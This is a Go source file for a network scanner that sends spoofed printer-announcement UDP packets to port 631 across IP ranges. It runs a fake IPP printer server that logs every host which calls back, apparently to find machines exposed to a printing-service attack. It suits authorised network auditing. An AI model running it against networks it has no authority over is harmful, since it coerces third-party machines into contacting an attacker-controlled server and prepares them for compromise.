package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"sync"

	//external packages
	"github.com/schollz/progressbar/v3"
)

// Packet represents the UDP packet information
type Packet struct {
	Message  string
	DestIP   string
	DestPort int
}

// Function to read a file for a list of CIDR ranges or IPs
func readTargetFile(filename string) ([]string, error) {
	var targets []string
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		targets = append(targets, scanner.Text())
	}
	if err = scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return targets, nil
}

// Function to generate IPs from a CIDR block
func generateIPs(cidr string) ([]string, error) {
	var ips []string
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}
	return ips, nil
}

// Function to increment the IP
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// Function to send UDP packet
func sendPacket(packet Packet, wg *sync.WaitGroup) {
	defer wg.Done()

	// Prepare the UDP address
	address := net.JoinHostPort(packet.DestIP, strconv.Itoa(packet.DestPort))
	udpAddr, err := net.ResolveUDPAddr("udp", address)
	if err != nil {
		log.Printf("Failed to resolve address %s: %v\n", address, err)
		return
	}

	// Create a UDP connection
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		log.Printf("Failed to dial UDP address %s: %v\n", address, err)
		return
	}
	defer conn.Close()

	// Send the message
	_, err = conn.Write([]byte(packet.Message))
	if err != nil {
		log.Printf("Failed to send UDP packet to %s: %v\n", address, err)
	}
}

// Function to batch packets and send them concurrently using goroutines
func sendPacketsInBatches(packets []Packet, batchSize int) {
	var wg sync.WaitGroup
	bar := progressbar.NewOptions(len(packets), progressbar.OptionSetDescription("Packet Progress"), progressbar.OptionSetElapsedTime(true))

	// Send in batches
	for i := 0; i < len(packets); i += batchSize {
		end := i + batchSize
		if end > len(packets) {
			end = len(packets)
		}

		// Create a batch of packets
		batch := packets[i:end]
		for _, packet := range batch {
			wg.Add(1)
			go sendPacket(packet, &wg)
		}
		wg.Wait()
		bar.Add(len(batch))
	}
	fmt.Println("")
}

// HTTP server to log incoming POST requests
// IPP version constants
const (
	IPP_VERSION_MAJOR = 0x02
	IPP_VERSION_MINOR = 0x00
	IPP_TAG_PRINTER   = 0x44
	IPP_TAG_OPERATION = 0x42
	IPP_SUCCESSFUL_OK = 0x0000
)

// PrinterAttributes defines a minimal set of printer attributes for a test printer
var printerAttributes = map[string]string{
	"printer-uri":   "http://localhost:999/printers/TestPrinter",
	"printer-name":  "TestPrinter",
	"printer-info":  "This is a test printer.",
	"printer-state": strconv.Itoa(3), // 3: Printer Idle
}

// Function to handle incoming IPP POST requests
func handleIPP(w http.ResponseWriter, r *http.Request) {
	// Log the incoming request
	clientIP := r.RemoteAddr
	log.Printf("Received POST request from %s", clientIP)

	// Ensure the request is a POST
	if r.Method != http.MethodPost {
		http.Error(w, "Only POST method is allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read the body of the POST request (assuming IPP is sent in body)
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read IPP request body", http.StatusInternalServerError)
		return
	}

	// IPP typically starts with version, operation ID, and request ID
	versionMajor := body[0]
	versionMinor := body[1]
	if versionMajor != IPP_VERSION_MAJOR || versionMinor != IPP_VERSION_MINOR {
		http.Error(w, "Unsupported IPP version", http.StatusBadRequest)
		return
	}

	// Extract request ID (big-endian)
	requestID := binary.BigEndian.Uint32(body[4:8])

	// Log the request details
	log.Printf("Received IPP request with request ID: %d, version: %d.%d\n", requestID, versionMajor, versionMinor)

	// Construct IPP response with minimal printer attributes
	var response bytes.Buffer

	// IPP version and status code (successful OK)
	response.WriteByte(IPP_VERSION_MAJOR)
	response.WriteByte(IPP_VERSION_MINOR)
	binary.Write(&response, binary.BigEndian, uint16(IPP_SUCCESSFUL_OK))

	// Write request ID back in response
	binary.Write(&response, binary.BigEndian, requestID)

	// Start with a tag for operation attributes (0x01)
	response.WriteByte(IPP_TAG_OPERATION)

	// Add operation attributes (minimally required for IPP)
	writeIPPAttribute(&response, "charset", "utf-8")
	writeIPPAttribute(&response, "natural-language", "en")

	// Write tag for printer attributes (0x04)
	response.WriteByte(IPP_TAG_PRINTER)

	// Write minimal printer attributes
	for name, value := range printerAttributes {
		writeIPPAttribute(&response, name, value)
	}

	// End attributes with 0x03 (end-of-attributes tag)
	response.WriteByte(0x03)

	// Write response to client
	w.Header().Set("Content-Type", "application/ipp")
	w.WriteHeader(http.StatusOK)
	w.Write(response.Bytes())
}

// Function to write an IPP attribute to the response buffer
func writeIPPAttribute(buffer *bytes.Buffer, name string, value string) {
	// Write the tag for the attribute (0x48: name, 0x44: text)
	buffer.WriteByte(0x44) // Assume all attributes are text for simplicity

	// Write the length of the name (big-endian)
	binary.Write(buffer, binary.BigEndian, uint16(len(name)))

	// Write the attribute name
	buffer.WriteString(name)

	// Write the length of the value (big-endian)
	binary.Write(buffer, binary.BigEndian, uint16(len(value)))

	// Write the attribute value
	buffer.WriteString(value)
}

func printBanner() {
	text := `
	  . .
	  .. . *.
- -_ _-__-0oOo
 _-_ -__ -||||)
    ______||||______
~~~~~~~~~~^""' Spill
`
	fmt.Println(text)
}

func main() {
	// Command-line arguments
	targetPtr := flag.String("target", "", "Target IP address, CIDR network, or filename to scan")
	portPtr := flag.String("port", "631", "Target UDP port")
	destPtr := flag.String("dest", "", "IP address for callbacks")
	destPortPtr := flag.String("destport", "12345", "TCP port to listen on for HTTP callbacks")
	flag.Parse()

	// Print Banner
	printBanner()

	// Run HTTP server in a separate goroutine
	log.Printf("Starting HTTP server on port %s...", *destPortPtr)
	http.HandleFunc("/printers/TestPrinter", handleIPP)
	go http.ListenAndServe(fmt.Sprintf(":%s", *destPortPtr), nil)

	var ipPat = regexp.MustCompile(`^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`)
	var cidrPat = regexp.MustCompile(`^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$`)
	var filePat = regexp.MustCompile(`^(.+)\/([^\/]+)$`)

	var ips []string
	var err error

	switch {
	// Cover if the argument is not passed
	case ipPat.MatchString(*targetPtr):
		// Single IP
		fmt.Printf("Scanning IP address: %s\n", *targetPtr)
		ips = append(ips, *targetPtr)
	case cidrPat.MatchString(*targetPtr):
		// CIDR Handling
		fmt.Printf("Scanning IP network %s\n", *targetPtr)
		ips, err = generateIPs(*targetPtr)
		if err != nil {
			log.Fatalf("Failed to parse CIDR: %v\n", err)
		}
	case filePat.MatchString(*targetPtr):
		// File handling
		fmt.Printf("Reading files from %s to scan\n", *targetPtr)
		fileContents, err := readTargetFile(*targetPtr)
		if err != nil {
			log.Fatalf("Failed to read file %s", fileContents)
		}
		for i := 0; i < len(fileContents); i++ {
			currIter, err := generateIPs(fileContents[i])
			if err != nil {
				log.Fatalf("failed to generate IP addresses %s", err)
				os.Exit(1)
			}
			ips = append(ips, currIter...)
		}
	default:
		// No argument passed
		noIpError := errors.New("no target ip address specified:\nUsage: ")
		fmt.Println(noIpError.Error())
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Create packets for each IP in the CIDR
	var packets []Packet
	for _, ip := range ips {
		packet := Packet{
			Message:  fmt.Sprintf("%x %x %s %s %s", 0x00, 0x03, fmt.Sprintf("http://%s:%s/printers/TestPrinter", *destPtr, *destPortPtr), "Office HQ", "Printer"),
			DestIP:   ip,
			DestPort: parsePort(*portPtr),
		}
		packets = append(packets, packet)
	}

	// Send UDP packets in batches
	batchSize := 10 // Example batch size, can be modified
	sendPacketsInBatches(packets, batchSize)

	//block the main goroutine to keep HTTP up
	select {}
}

// Helper function to parse port
func parsePort(portStr string) int {
	port, err := strconv.Atoi(portStr)
	if err != nil {
		log.Fatalf("Invalid port: %v\n", err)
	}
	return port
}
